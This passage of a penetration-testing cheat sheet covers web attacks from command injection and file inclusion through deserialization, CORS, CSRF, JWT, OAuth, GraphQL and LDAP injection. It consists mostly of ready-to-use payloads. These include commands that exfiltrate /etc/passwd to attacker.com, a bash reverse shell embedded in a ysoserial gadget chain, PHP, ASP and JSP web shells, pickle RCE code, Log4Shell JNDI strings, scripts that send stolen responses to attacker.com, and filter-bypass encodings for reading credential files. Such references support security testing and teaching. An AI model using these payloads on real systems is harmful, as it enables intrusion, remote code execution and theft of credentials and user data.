; curl -d @/etc/passwd http://attacker.com/exfil
; wget http://attacker.com/$(hostname)
; nslookup $(whoami).attacker.com
; host $(cat /etc/passwd|base64|tr -d '\n').attacker.com
```

### Filter Bypass Techniques
```bash
# Space bypass
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat<>/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X
IFS=,;`cat<<<id,/etc/passwd`

# Slash bypass
cat${HOME:0:1}etc${HOME:0:1}passwd
echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|bash

# Wildcard injection
cat /et?/pass*
cat /etc/p?sswd
ls /???/???s/*

# Encoded characters
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)

# Variable manipulation
cat /e''tc/pa''sswd
cat /e"t"c/pa"s"swd

# Bypass keyword blacklists
w'h'o'a'm'i
w"h"o"a"m"i
who\ami
/usr/bin/wh?ami
```

### Windows Command Injection
```cmd
; ipconfig
& ipconfig
| ipconfig
|| ipconfig
`ipconfig`
$(ipconfig)
&& ipconfig

# CMD tricks
cmd /c "ipconfig"
powershell -c "Get-Process"
powershell -enc <base64_encoded_command>
```

### commix Tool
```bash
# Basic usage
commix -u "http://target/page?cmd=test"

# POST
commix -u "http://target/page" --data="param=test" -p param

# Cookie-based
commix -u "http://target/page" --cookie="PHPSESSID=abc; param=test" -p param

# HTTP header injection
commix -u "http://target/page" --header="X-Forwarded-For: *"

# Blind mode
commix -u "http://target/page?cmd=test" --technique=time

# Shell
commix -u "http://target/page?cmd=test" --os-shell

# Specify OS
commix -u "http://target/page?cmd=test" --os=unix

# Level/risk
commix -u "http://target/page?cmd=test" --level=3
```

### Cheat Sheet
| Context | Payload |
|---------|---------|
| Linux time-based | `; sleep 5` |
| Windows time-based | `& timeout 5` |
| DNS OOB | `; nslookup $(whoami).attacker.com` |
| HTTP OOB | `; curl http://attacker.com/$(id\|base64)` |
| Space bypass | `cat${IFS}/etc/passwd` |
| Pipe chain | `id\|base64\|curl -d @- http://attacker.com` |

---

## 7. File Inclusion (LFI/RFI)

### Description
Local File Inclusion (LFI) and Remote File Inclusion (RFI) occur when an application includes files based on user input without validation.

### Basic LFI Payloads
```
../../../etc/passwd
../../etc/passwd
../etc/passwd

# Null byte (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# URL encoding
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd

# Double encoding
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Common Files to Read
```
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/version
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/mail/root
~/.ssh/id_rsa
~/.ssh/authorized_keys
~/.bash_history
/etc/mysql/my.cnf
/etc/php/7.x/apache2/php.ini

# Windows
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\system.ini
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
C:\Users\Administrator\Desktop\*
C:\boot.ini
```

### PHP Wrappers
```
# php://filter - read PHP source (base64 encoded)
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd

# php://input - execute POST body as PHP (needs allow_url_include)
php://input
# POST body: <?php system('id'); ?>

# data:// - execute inline PHP (needs allow_url_include)
data://text/plain,<?php system('id')?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

# expect:// - execute OS commands (needs expect extension)
expect://id
expect://whoami

# zip:// - include PHP inside ZIP
zip://malicious.zip#shell.php

# phar:// - include PHP inside PHAR
phar://malicious.phar/shell.php
```

### LFI to RCE Techniques

#### Log Poisoning (Apache/Nginx)
```bash
# Step 1: Poison access log via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/

# Step 2: Include the log file
http://target/page.php?file=/var/log/apache2/access.log&cmd=id
http://target/page.php?file=/var/log/nginx/access.log&cmd=id
```

#### /proc/self/environ
```
# Include environ file (User-Agent is injected)
# First set User-Agent to: <?php system('id'); ?>
/proc/self/environ
```

#### Session File Poisoning
```php
// Step 1: Create PHP code in session
/page.php?page=<?php system('id'); ?>
// Step 2: Include session file
/page.php?file=/var/lib/php/sessions/sess_SESSIONID
```

#### pearcmd RCE (Docker PHP images)
```
# Trigger pearcmd
/usr/local/lib/php/pearcmd.php

# Payload
?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php
```

### Remote File Inclusion (RFI)
```
# Basic RFI (needs allow_url_include=On)
http://target/page.php?file=http://attacker.com/shell.php
http://target/page.php?file=https://attacker.com/shell.php
http://target/page.php?file=ftp://attacker.com/shell.php

# Null byte bypass
http://target/page.php?file=http://attacker.com/shell.php%00

# Windows UNC bypass
http://target/page.php?file=\\attacker.com\share\shell.php
```

### dotdotpwn Tool
```bash
# HTTP mode
dotdotpwn -m http -h target.com -k "root:" -q

# FTP mode
dotdotpwn -m ftp -h target.com -u user -p pass

# Specify depth
dotdotpwn -m http -h target.com -d 10

# Custom extension
dotdotpwn -m http -h target.com -e ".php"
```

### Cheat Sheet
| Technique | Requirement | Payload |
|-----------|-------------|---------|
| php://filter | Any PHP LFI | `php://filter/convert.base64-encode/resource=index.php` |
| Log poisoning | Read log file | Inject PHP via User-Agent, include log |
| /proc/self/environ | LFI reads environ | Inject PHP via User-Agent |
| php://input | allow_url_include | POST `<?php system('id'); ?>` |
| data:// | allow_url_include | `data://text/plain,<?php system('id')?>` |
| RFI | allow_url_include | `http://attacker.com/shell.php` |

---

## 8. File Upload Bypass

### Description
File upload vulnerabilities allow attackers to upload malicious files (web shells, executables) by bypassing validation controls.

### Extension Bypass
```
# PHP variants (when .php is blocked)
.php2 .php3 .php4 .php5 .php6 .php7
.pht .phtml .shtml
.phar
.pgif (php + gif header)

# ASP variants
.asp .aspx .cer .asa
.ashx .config

# JSP variants
.jsp .jspx .jspf .jspa

# Double extension
file.php.jpg
file.jpg.php
file.php%00.jpg     (null byte, older PHP)
file.php%20         (space)
file.php.          (trailing dot)
file.php/
file.php::$DATA    (Windows NTFS ADS)

# Case variation
file.PHP
file.Php
file.PHp

# Special characters
file.p%68p
file.p\nyhp
```

### MIME Type / Magic Bytes Bypass
```
# Change Content-Type to image
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/webp

# Add magic bytes to PHP web shell
GIF89a<?php system($_GET['cmd']); ?>

# JPEG magic bytes
\xff\xd8\xff<?php system($_GET['cmd']); ?>

# PNG magic bytes
\x89PNG<?php system($_GET['cmd']); ?>

# Polyglot PHP/GIF (saved as .gif but parsed as PHP)
GIF89a; <?php system($_GET['cmd']); ?>
```

### .htaccess Trick (Apache)
```apache
# Upload as .htaccess:
AddType application/x-httpd-php .jpg
# Now .jpg files will be executed as PHP

# Alternative
AddHandler php-script .jpg
SetHandler application/x-httpd-php
```

### Web Shell Payloads
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
<?php passthru($_GET['cmd']); ?>
<?php $cmd=$_GET['cmd']; system($cmd); ?>
<?php eval($_POST['c']); ?>
<?php @eval($_REQUEST['c']); ?>
<?=`$_GET[cmd]`?>

# Minimal PHP shell
<?=`{$_GET[c]}`?>

# Obfuscated
<?php $f=base64_decode('c3lzdGVt');$f($_GET['c']);?>
```

```asp
<!-- ASP web shell -->
<%eval request("cmd")%>
<%Response.Write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()%>
```

```jsp
<!-- JSP web shell -->
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
<%@ page import="java.io.*"%>
<%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

### Bypass File Content Validation
```bash
# Exiftool - inject PHP code into image metadata
exiftool -Comment='<?php system($_GET["c"]); ?>' legit.jpg -o shell.jpg

# ImageMagick - create PHP-as-image
convert -size 32x32 xc:white -comment '<?php system($_GET["c"]); ?>' shell.png
```

### ZIP Slip (Path Traversal via ZIP)
```python
# Create malicious ZIP with path traversal
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as zf:
    zf.write('shell.php', '../../../var/www/html/shell.php')
```

### Cheat Sheet
| Bypass Type | Technique |
|-------------|-----------|
| Extension block | Try `.php5`, `.phtml`, `.phar` |
| MIME check | Change `Content-Type: image/jpeg`, add GIF89a header |
| Content check | Polyglot file (GIF89a + PHP shell) |
| Blacklist | Add `.htaccess` to interpret .jpg as PHP |
| Null byte | `file.php%00.jpg` (PHP < 5.3.4) |
| Double ext | `file.jpg.php` or `file.php.jpg` |
| Windows ADS | `file.php::$DATA` |

---

## 9. Insecure Deserialization

### Description
Deserialization vulnerabilities allow attackers to manipulate serialized objects to achieve RCE, authentication bypass, or object injection by exploiting pre-existing code paths (gadget chains).

### Detection — Magic Bytes
```
# Java serialized object
AC ED 00 05 (hex) = rO0AB (base64)

# PHP serialized string
O:8:"stdClass":0:{}
a:2:{i:0;s:4:"test";}

# Python pickle
\x80\x04  (pickle protocol 4)
\x80\x02  (pickle protocol 2)

# .NET binary formatter
00 01 00 00 00  (SOAP)
```

### Java — ysoserial Gadget Chains
```bash
# Download: https://github.com/frohoff/ysoserial
# Usage
java -jar ysoserial.jar PAYLOAD_TYPE 'COMMAND' > payload.ser

# Popular gadget chains
java -jar ysoserial.jar CommonsCollections1 'id' > cc1.ser
java -jar ysoserial.jar CommonsCollections2 'id' > cc2.ser
java -jar ysoserial.jar CommonsCollections3 'id' > cc3.ser
java -jar ysoserial.jar CommonsCollections4 'id' > cc4.ser
java -jar ysoserial.jar CommonsCollections5 'id' > cc5.ser
java -jar ysoserial.jar CommonsCollections6 'id' > cc6.ser
java -jar ysoserial.jar Groovy1 'id' > groovy1.ser
java -jar ysoserial.jar Spring1 'id' > spring1.ser
java -jar ysoserial.jar Spring2 'id' > spring2.ser
java -jar ysoserial.jar BeanShell1 'id' > bean.ser
java -jar ysoserial.jar URLDNS 'http://attacker.com' > urldns.ser

# Base64 encode for HTTP params
java -jar ysoserial.jar CommonsCollections1 'id' | base64 -w 0

# Reverse shell
java -jar ysoserial.jar CommonsCollections1 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```

### PHP — phpggc Gadget Chains
```bash
# Download: https://github.com/ambionics/phpggc
# List available chains
phpggc -l

# Specific framework chains
phpggc Laravel/RCE7 system id
phpggc Symfony/RCE4 system id
phpggc Yii/RCE1 system id
phpggc Magento/RCE3 system id
phpggc Drupal7/RCE1 system id
phpggc Guzzle/FW1 /var/www/html/shell.php '<?php system($_GET["c"]); ?>'

# Base64 encode output
phpggc Laravel/RCE7 system 'id' -b

# JSON encode
phpggc Laravel/RCE7 system 'id' -j
```

### PHP Object Injection (Manual)
```php
// Vulnerable code example:
$obj = unserialize($_COOKIE['data']);

// PHP magic methods exploited:
// __destruct(), __wakeup(), __toString()

// Example payload targeting a class with __destruct():
class User {
    public $logFile = '/tmp/test.log';
    public function __destruct() {
        unlink($this->logFile);
    }
}
// Payload: O:4:"User":1:{s:7:"logFile";s:11:"/etc/passwd";}
```

### Python — Pickle RCE
```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())

# Minimal pickle RCE
import pickle, base64
payload = b"cos\nsystem\n(S'id'\ntR."
print(base64.b64encode(payload).decode())
```

### .NET — ysoserial.net
```powershell
# Windows: https://github.com/pwntester/ysoserial.net

# BinaryFormatter
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "cmd /c calc"
ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "cmd /c whoami"

# JSON.NET
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "cmd /c calc"

# ViewState (.NET WebForms)
ysoserial.exe -p ViewState -g WindowsIdentity -c "cmd /c calc" --validationalg="SHA1" --validationkey="..."

# SoapFormatter
ysoserial.exe -f SoapFormatter -g WindowsIdentity -o base64 -c "cmd /c calc"
```

### Java — Deserialization via JNDI (Log4Shell style)
```
# Log4j JNDI injection
${jndi:ldap://attacker.com:1389/exploit}
${jndi:rmi://attacker.com:1099/exploit}
${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/exploit}
${${::-j}${::-n}${::-d}${::-i}:...}

# Setup marshalsec listener
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8888/#Exploit"
```

### Cheat Sheet
| Platform | Tool | Detection |
|----------|------|-----------|
| Java | ysoserial | `AC ED 00 05` / `rO0AB...` |
| PHP | phpggc | `O:`, `a:`, `s:`, `b:` |
| Python | Manual pickle | `\x80\x02` / `\x80\x04` |
| .NET | ysoserial.net | `AAEAAAD` (base64 binary formatter) |
| Ruby | Marshal | `\x04\x08` |
| Node.js | node-serialize | `_$$ND_FUNC$$_` |

---

## 10. Directory Traversal / Path Traversal

### Description
Path traversal allows reading files outside the web root by manipulating file path parameters with `../` sequences.

### Basic Payloads
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### Encoding Variants
```
# URL encoding (../)
%2e%2e%2f  →  ../
%2e%2e/    →  ../
..%2f      →  ../

# Double URL encoding
%252e%252e%252f  →  %2e%2e%2f  →  ../

# Overlong UTF-8 encoding
%c0%af  →  /  (overlong encoding)
%e0%80%af  →  /

# UCS-2 encoding
%u002e%u002e%u002f  →  ../
%uff0e%uff0e%u2215  →  (full-width)

# Backslash (Windows)
..\..\..\windows\win.ini
..\..\..\..\windows\win.ini
%2e%2e%5c%2e%2e%5c  →  ..\..\
```

### Filter Bypass
```
# Null byte
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# Start URL
file:///etc/passwd

# Absolute path (if filter only blocks ..)
/etc/passwd
/../../etc/passwd

# If app strips traversal sequence once
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..%252f..%252f..%252f  (double encoded)
```

### Windows Specific
```
..\..\..\windows\win.ini
..\..\..\..\windows\win.ini
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
..\..\..\boot.ini
..\..\..\inetpub\wwwroot\global.asa

# UNC path bypass
\\127.0.0.1\c$\windows\win.ini
file:///c:/windows/win.ini
```

### Java Traversal
```
# URL path (Spring, Tomcat)
/..;/admin/
/;/admin/
/./admin/
```

### Cheat Sheet
| Encoding | Payload |
|----------|---------|
| None | `../../../etc/passwd` |
| URL | `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` |
| Double URL | `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd` |
| Double slash | `....//....//....//etc/passwd` |
| Mixed | `..%2f..%2f..%2fetc%2fpasswd` |
| Null byte | `../../../etc/passwd%00.jpg` |

---

## 11. CORS Misconfiguration

### Description
CORS misconfigurations allow malicious sites to make cross-origin authenticated requests, potentially stealing sensitive data or taking actions on behalf of users.

### Detection — Test Payloads
```
# Test with Origin header
Origin: https://attacker.com
Origin: null
Origin: https://trusted.com.attacker.com
Origin: https://attackertrusted.com
Origin: https://trusted.com_attacker.com

# If server reflects Origin in Access-Control-Allow-Origin:
# → Vulnerable to CORS attack
```

### Origin Reflection Exploit
```javascript
// Victim site reflects any Origin
var req = new XMLHttpRequest();
req.open('GET', 'https://vulnerable.com/api/user', true);
req.withCredentials = true;
req.onload = function() {
    var data = req.responseText;
    fetch('http://attacker.com/steal?d=' + btoa(data));
};
req.send();
```

### Null Origin Exploit
```html
<!-- Sandboxed iframe sends null origin -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
var req = new XMLHttpRequest();
req.open('GET', 'https://vulnerable.com/api/user', true);
req.withCredentials = true;
req.onload = function() {
    fetch('http://attacker.com/steal?d=' + btoa(req.responseText));
};
req.send();
</script>
"></iframe>
```

### Subdomain Takeover + CORS
```
# If CORS allows *.trusted.com but a subdomain is taken over:
# 1. Find dangling subdomain: sub.trusted.com → unclaimed S3/Azure/Heroku
# 2. Claim the subdomain
# 3. Host CORS exploit at sub.trusted.com
```

### CORS Testing with curl
```bash
# Test Origin reflection
curl -I -H "Origin: https://evil.com" https://target.com/api/data

# Test with credentials
curl -I -H "Origin: https://evil.com" \
     -H "Cookie: session=abc123" \
     https://target.com/api/user

# Check response headers:
# Access-Control-Allow-Origin: https://evil.com  ← vulnerable (reflection)
# Access-Control-Allow-Credentials: true         ← allows credential theft
# Access-Control-Allow-Origin: *                 ← public data only (OK if no credentials)
```

### Cheat Sheet
| Misconfiguration | Impact | Test |
|-----------------|--------|------|
| Origin reflection | Session theft | Set `Origin: attacker.com`, check ACAO header |
| Null origin | Session theft | Set `Origin: null`, check ACAO header |
| Regex bypass | Session theft | `Origin: trusted.com.evil.com` |
| Wildcard + credentials | Session theft | Check if ACAO=* with ACAC=true (browsers block this but misconfig) |
| Pre-flight bypass | CSRF | Test PUT/DELETE with content-type changes |

---

## 12. CSRF (Cross-Site Request Forgery)

### Description
CSRF tricks authenticated users into making unintended requests. Exploits trust that a server has in a user's browser.

### Basic HTML Form CSRF
```html
<!-- Auto-submit form targeting victim -->
<html>
<body onload="document.forms[0].submit()">
<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm_email" value="attacker@evil.com">
</form>
</body>
</html>
```

### GET-based CSRF
```html
<!-- Hidden image triggers GET request -->
<img src="https://target.com/delete?id=123" style="display:none">

<!-- Auto-redirect -->
<script>document.location = "https://target.com/transfer?to=attacker&amount=1000"</script>
```

### AJAX CSRF (Same-Origin Policy bypassed)
```javascript
// Simple request (no preflight): application/x-www-form-urlencoded, text/plain, multipart/form-data
fetch('https://target.com/api/action', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'action=delete&id=123'
});
```

### JSON CSRF
```html
<!-- If server accepts JSON via form POST -->
<form action="https://target.com/api/action" method="POST" enctype="text/plain">
  <input name='{"action":"delete","id":"123","ignore":"' value='"}'>
</form>
<!-- Sends: {"action":"delete","id":"123","ignore":"="} -->
<script>document.forms[0].submit()</script>
```

### CSRF Token Bypass Techniques
```
1. Remove CSRF token entirely — server may not validate absence
2. Use any valid token — token may not be tied to session
3. Reuse previously issued token
4. Change POST to GET — token may only be checked on POST
5. Token in URL → leak via Referer header
6. Token predictable (timestamp, increment) → enumerate
7. XSS to steal token, then use in CSRF
```

### SameSite Cookie Bypass
```
# SameSite=Lax only blocks cross-site POSTs, not GET
# Navigate victim to: https://target.com/action?param=evil

# SameSite=None (must have Secure) → vulnerable to classic CSRF

# Top-level navigation (SameSite=Lax bypass via GET)
window.open('https://target.com/action?param=evil')
document.location = 'https://target.com/action?param=evil'
```

### Cheat Sheet
| CSRF Type | Payload |
|-----------|---------|
| GET | `<img src="https://target/action?param=val">` |
| POST form | Auto-submit hidden form |
| JSON | `enctype=text/plain` form trick |
| Multipart | `enctype=multipart/form-data` form |
| Token bypass | Try removing token, try GET method, try XSS to steal |

---

## 13. JWT Attacks

### Description
JWT (JSON Web Token) attacks exploit weaknesses in token validation, algorithm selection, and key management.

### JWT Structure
```
Header.Payload.Signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Header: {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"1234567890","name":"John","role":"user","iat":1516239022}
```

### Algorithm None Attack (CVE-2015-9235)
```
# Create token with no signature by setting alg to "none"
# Original: eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.SIGNATURE

# Step 1: Decode header
echo eyJhbGciOiJIUzI1NiJ9 | base64 -d
# {"alg":"HS256"}

# Step 2: Create new header with none
echo -n '{"alg":"none"}' | base64 | tr -d '='
# eyJhbGciOiJub25lIn0

# Step 3: Modify payload (escalate to admin)
echo -n '{"role":"admin"}' | base64 | tr -d '='
# eyJyb2xlIjoiYWRtaW4ifQ

# Step 4: Combine with empty signature
eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.

# Variations
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
```

### RS256 to HS256 Key Confusion (CVE-2016-5431)
```bash
# If server uses RS256 but HS256 is accepted:
# Sign with RSA public key as the HMAC secret

# Step 1: Get RSA public key
openssl s_client -connect target.com:443 2>&1 | openssl x509 -pubkey -noout > pubkey.pem

# Step 2: Use jwt_tool to exploit
python3 jwt_tool.py TOKEN -X k -pk pubkey.pem

# Step 3: Or manually sign
# Set header alg to HS256, sign with HMAC using public key as secret
```

### JWK Header Injection (CVE-2018-0114)
```json
// Inject your own JWK into the header
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "kid": "my-key",
    "use": "sig",
    "n": "ATTACKER_PUBLIC_KEY_MODULUS",
    "e": "AQAB"
  },
  "typ": "JWT"
}
// Sign with corresponding attacker private key
```

### jku SSRF Attack
```json
// Set jku to attacker-controlled URL hosting malicious JWKS
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json",
  "kid": "mykey"
}

// attacker.com/jwks.json:
{
  "keys": [{
    "kty": "RSA",
    "kid": "mykey",
    "use": "sig",
    "n": "ATTACKER_N",
    "e": "AQAB"
  }]
}
```

### kid Path Traversal / Injection
```json
// kid used in file path or SQL
{"alg":"HS256","kid":"../../dev/null"}
// Sign with empty string as secret

// SQL injection via kid
{"alg":"HS256","kid":"' UNION SELECT 'attacker-secret' -- -"}
// Sign with 'attacker-secret' as HMAC secret
```

### Weak Secret Brute Force
```bash
# hashcat JWT cracking
hashcat -a 0 -m 16500 eyJhbGc... /usr/share/wordlists/rockyou.txt

# john
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# jwt_tool brute force
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

### jwt_tool — Complete Toolkit
```bash
# Decode and analyse token
python3 jwt_tool.py TOKEN

# Test all attacks automatically
python3 jwt_tool.py TOKEN -t https://target.com/api -rh "Authorization: Bearer TOKEN"

# None algorithm
python3 jwt_tool.py TOKEN -X a

# RS256 to HS256 confusion
python3 jwt_tool.py TOKEN -X k -pk pubkey.pem

# Crack secret
python3 jwt_tool.py TOKEN -C -d wordlist.txt

# Forge with known secret
python3 jwt_tool.py TOKEN -S hs256 -p "secret" -I -pc role -pv admin

# jku exploit
python3 jwt_tool.py TOKEN -X s -ju "http://attacker.com/jwks.json"
```

### Cheat Sheet
| Attack | CVE | Tool | Payload |
|--------|-----|------|---------|
| None algorithm | CVE-2015-9235 | jwt_tool -X a | `{"alg":"none"}` empty sig |
| Key confusion | CVE-2016-5431 | jwt_tool -X k | RS256 → HS256 with pubkey |
| jwk inject | CVE-2018-0114 | jwt_tool -X s | Embed attacker JWK in header |
| jku SSRF | - | jwt_tool -X s | Set jku to attacker URL |
| kid traversal | - | Manual | `../../dev/null` sign empty |
| Brute force | - | hashcat -m 16500 | Crack HS256 secret |

---

## 14. OAuth Misconfiguration

### Description
OAuth misconfigurations allow account takeover, token theft, and privilege escalation by exploiting weaknesses in the OAuth 2.0 flow.

### redirect_uri Manipulation
```
# Original callback
https://target.com/callback?code=AUTH_CODE

# Test manipulations:
# 1. Open redirect → steal code
https://target.com/callback?redirect_uri=https://attacker.com/steal

# 2. Appending attacker path
https://target.com/callback/../../../redirect?to=https://attacker.com

# 3. Adding @ symbol
https://attacker.com@target.com/callback

# 4. Subdomain wildcard abuse
https://evil.target.com/callback

# 5. Fragment identifier (code in Referer header of redirect)
https://target.com/callback#https://attacker.com

# 6. URI scheme (open redirect in target app)
https://target.com/callback?next=//attacker.com
```

### state Parameter CSRF
```
# Authorization URL without state:
https://authserver.com/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/callback
  # NO state parameter → CSRF attack possible

# Exploit: Trick victim to visit authorization URL
# → Victim's browser sends code to target.com
# → If attacker already visited URL, attacker's session gets linked to victim's account
```

### Implicit Flow Token Theft
```
# Implicit flow returns access_token in URL fragment
https://target.com/callback#access_token=TOKEN&token_type=bearer

# Attack: Inject malicious redirect_uri to steal token in fragment
# If app uses postMessage to pass token between windows:
window.addEventListener("message", function(e) {
    fetch('http://attacker.com/steal?token=' + e.data.access_token);
});
```

### Scope Escalation
```
# Request additional scopes
https://authserver.com/authorize?
  response_type=code&
  client_id=CLIENT_ID&
  scope=read+write+admin
  # Test adding privileged scopes

# Scope change during token refresh:
POST /token
grant_type=refresh_token&
refresh_token=REFRESH_TOKEN&
scope=admin    # Try escalating scope
```

### Token Leakage via Referer
```
# OAuth token or code in URL → leaks in Referer header when navigating to external resources
# Setup: Include external resource in target app after auth code/token landing page
```

### Account Takeover via Provider Misconfiguration
```
# Pre-account linking attack:
# 1. Create account at victim.com with target email
# 2. OAuth link to attacker-controlled provider account
# 3. Wait for victim to register with same email
# 4. Now attacker's OAuth controls victim's account
```

### Cheat Sheet
| Attack | Test Payload | Impact |
|--------|-------------|--------|
| redirect_uri bypass | Add attacker.com subdomain or path traversal | Auth code theft |
| Missing state | No state= in authorization URL | CSRF account linking |
| Open redirect + token | redirect_uri pointing to open redirect in app | Token theft |
| Scope escalation | Add admin/write scopes to request | Privilege escalation |
| Implicit token leak | Manipulate redirect, steal fragment | Token theft |

---

## 15. GraphQL Attacks

### Description
GraphQL APIs are often less secured than REST APIs. Key attacks include introspection abuse, batching attacks, query depth/complexity bypass, and injection via resolvers.

### Introspection Query
```graphql
# Dump full schema
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

# Find all queries and mutations
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      description
      fields {
        name
        description
        args { name type { name kind } }
        type { name kind }
      }
    }
  }
}

# Bypass introspection disable via newlines/whitespace
{"query": "{ __schema\n{ queryType\n{ name } } }"}
```

### Batching Attack (Brute Force / Rate Limit Bypass)
```graphql
# Array batching (send multiple operations at once)
[
  {"query": "mutation { login(username:\"admin\", password:\"pass1\") { token } }"},
  {"query": "mutation { login(username:\"admin\", password:\"pass2\") { token } }"},
  {"query": "mutation { login(username:\"admin\", password:\"pass3\") { token } }"}
]

# Inline batching (alias-based)
{
  q1: login(username:"admin", password:"pass1") { token }
  q2: login(username:"admin", password:"pass2") { token }
  q3: login(username:"admin", password:"pass3") { token }
}
```

### Field Suggestions (Information Leakage)
```graphql
# If schema exists but introspection disabled, typos reveal field names
{ usr { id } }
# → Did you mean "user"?
# → Did you mean "users"?

{ users { nam } }
# → Did you mean "name"? "email"?
```

### SQL/NoSQL Injection via GraphQL
```graphql
# Test SQL injection in GraphQL arguments
{
  users(filter: "1=1 -- ") {
    id username email
  }
}

{
  product(id: "1 UNION SELECT username,password,NULL FROM users--") {
    name price
  }
}

# NoSQL injection
{
  users(filter: {username: {$ne: null}}) {
    id username
  }
}
```

### IDOR via GraphQL
```graphql
# Access other users' data by changing ID
{
  user(id: 1) { email role }
  user(id: 2) { email role }
  user(id: 3) { email role }
}

# Batch IDOR
[
  {"query": "{ user(id: 100) { email } }"},
  {"query": "{ user(id: 101) { email } }"}
]
```

### Denial of Service via Deep Query
```graphql
# Circular fragment (if not protected)
{
  user {
    friends {
      friends {
        friends {
          friends {
            id email
          }
        }
      }
    }
  }
}
```

### GraphQL Mutation Attacks
```graphql
# Account takeover via password reset mutation
mutation {
  resetPassword(email: "victim@target.com") {
    token
  }
}

# Create admin user
mutation {
  createUser(username: "attacker", password: "password", role: "ADMIN") {
    id
  }
}

# SSRF via URL parameter in mutation
mutation {
  importData(url: "http://169.254.169.254/latest/meta-data/") {
    result
  }
}
```

### Tools
```bash
# graphw00f - fingerprint GraphQL engine
graphw00f -t https://target.com/graphql

# InQL Burp extension (manual testing)

# clairvoyance - recover schema without introspection
clairvoyance -u https://target.com/graphql -o schema.json

# graphql-cop - security testing tool
graphql-cop -t https://target.com/graphql
```

---

## 16. LDAP Injection

### Description
LDAP injection manipulates LDAP queries by injecting LDAP filter syntax, potentially leading to authentication bypass or data extraction.

### Detection Characters
```
*
(
)
\
NUL (%00)
&
|
```

### Authentication Bypass
```
# Original query: (&(uid=USER)(password=PASS))
# Inject:
Username: admin)(&
Password: anything
# Result: (&(uid=admin)(&)(password=anything)) → evaluates uid=admin

Username: admin))(|(uid=*
Password: anything
# Result: (&(uid=admin))(|(uid=*)(password=anything))

# Wildcard bypass
Username: *
Password: *
# Result: (&(uid=*)(password=*)) → matches any user

# More auth bypass payloads
admin*
*)(uid=*))(|(uid=*
*)(|(uid=*
*()|%26'
admin)(!(&(1=0
```

### Data Extraction (Boolean Blind)
```
# Test attribute existence/values
*(objectClass=*)
*(objectClass=user)
*(objectClass=person)

# Enumerate attributes
admin)(|(uid=a*
admin)(|(uid=b*
# → Find first character of valid uid

# Dump all
*(uid=*)
*(|(uid=user1)(uid=user2))
```

### LDAP Filters Cheat Sheet
```
# Basic filters
(attribute=value)       Equality
(attribute~=value)      Approximate
(attribute>=value)      Greater
(attribute<=value)      Less
(attribute=*)           Presence
(attribute=val*)        Substring (prefix)
